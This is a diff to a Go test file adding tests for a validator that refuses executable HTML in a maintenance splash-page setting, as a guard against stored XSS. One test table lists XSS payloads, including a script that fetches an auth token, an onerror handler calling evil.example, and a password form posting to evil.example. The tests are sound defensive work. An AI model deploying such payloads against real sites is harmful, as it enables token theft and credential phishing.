@@ -189,3 +189,103 @@ func TestEverySectionIsEitherAvailableOrExplained(t *testing.T) {
 		}
 	}
 }
+
+// ── The splash HTML body (maintenance_html) ──────────────────────────────────
+//
+// pylon stored `splash_template` as raw bytes and served them verbatim with no
+// sanitisation at all (legacy/plugins/bootstrap/tools/splash.py:164-178). The
+// port keeps the capability and refuses the executable half of it here, at the
+// moment an operator can still fix what they pasted.
+//
+// The check is deliberately paired with a client sanitiser rather than trusted
+// alone: this one keeps script out of a row that outlives every renderer, and
+// the renderer keeps script off screen for a row written before this check
+// existed. Each test below names which half it is asserting.
+
+func splashField() configSection {
+	return fieldSpec(map[string]any{
+		"key":    "maintenance_html",
+		"type":   "string",
+		"format": "html",
+	})
+}
+
+// TestSplashHTMLRoundTripsOrdinaryMarkup — the capability, not just the
+// refusal. A rule that refused everything would also pass every test below.
+func TestSplashHTMLRoundTripsOrdinaryMarkup(t *testing.T) {
+	body := `<p>We are upgrading the database.</p>` +
+		`<p>Status: <a href="https://status.example.com" target="_blank">status page</a></p>` +
+		`<ul><li>Starts 02:00 UTC</li><li>Ends 04:00 UTC</li></ul>`
+	if reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": body}); reason != "" {
+		t.Fatalf("an ordinary splash body was refused: %s", reason)
+	}
+}
+
+// TestSplashHTMLAcceptsAnEmptyBody — empty means "use the product's own
+// splash", so it must not be a validation error.
+func TestSplashHTMLAcceptsAnEmptyBody(t *testing.T) {
+	if reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": ""}); reason != "" {
+		t.Fatalf("an empty splash body was refused: %s", reason)
+	}
+}
+
+// TestSplashHTMLRefusesExecutableMarkup is the stored-XSS boundary. Each case
+// is a distinct way to run code in the browser of every user the maintenance
+// window refuses; none of them needs a `<script>` tag.
+func TestSplashHTMLRefusesExecutableMarkup(t *testing.T) {
+	cases := map[string]string{
+		"script tag":        `<p>hi</p><script>fetch('/api/v2/auth/token')</script>`,
+		"closing script":    `</SCRIPT ><p>hi</p>`,
+		"image handler":     `<img src=x onerror="fetch('//evil.example')">`,
+		"javascript url":    `<a href="javascript:alert(1)">click</a>`,
+		"iframe":            `<iframe src="https://evil.example"></iframe>`,
+		"style block":       `<style>body{display:none}</style>`,
+		"meta refresh":      `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
+		"base tag":          `<base href="https://evil.example/">`,
+		"credential form":   `<form action="https://evil.example"><input name="password"></form>`,
+		"svg vector":        `<svg onload="alert(1)"></svg>`,
+		"mixed case script": `<ScRiPt>alert(1)</ScRiPt>`,
+	}
+	for name, body := range cases {
+		t.Run(name, func(t *testing.T) {
+			reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": body})
+			if reason == "" {
+				t.Fatalf("executable splash markup was accepted: %s", body)
+			}
+			if !strings.Contains(reason, "maintenance_html") {
+				t.Errorf("the refusal does not name the field: %q", reason)
+			}
+		})
+	}
+}
+
+// TestSplashHTMLRefusalIsScopedToHTMLFields — the same markup in the MARKDOWN
+// message field is not refused here, because that field is rendered with raw
+// HTML disabled and would otherwise be unable to carry the words "<script>".
+func TestSplashHTMLRefusalIsScopedToHTMLFields(t *testing.T) {
+	section := fieldSpec(map[string]any{
+		"key": "maintenance_message", "type": "string", "format": "textarea",
+	})
+	if reason := validateSectionValues(section, map[string]any{
+		"maintenance_message": "Do not paste <script> tags into the HTML field.",
+	}); reason != "" {
+		t.Fatalf("a markdown message mentioning a script tag was refused: %s", reason)
+	}
+}
+
+// TestSplashHTMLIsBoundedBy64KiB — the row is served to every refused user on
+// every request, so an unbounded paste is a cost paid forever.
+func TestSplashHTMLIsBoundedBy64KiB(t *testing.T) {
+	atLimit := strings.Repeat("a", maxConfigValueBytes)
+	if reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": atLimit}); reason != "" {
+		t.Fatalf("a body exactly at the 64 KiB limit was refused: %s", reason)
+	}
+	overLimit := strings.Repeat("a", maxConfigValueBytes+1)
+	reason := validateSectionValues(splashField(), map[string]any{"maintenance_html": overLimit})
+	if reason == "" {
+		t.Fatal("a splash body over 64 KiB was accepted")
+	}
+	if !strings.Contains(reason, "too long") {
+		t.Errorf("the refusal does not say the value is too long: %q", reason)
+	}
+}
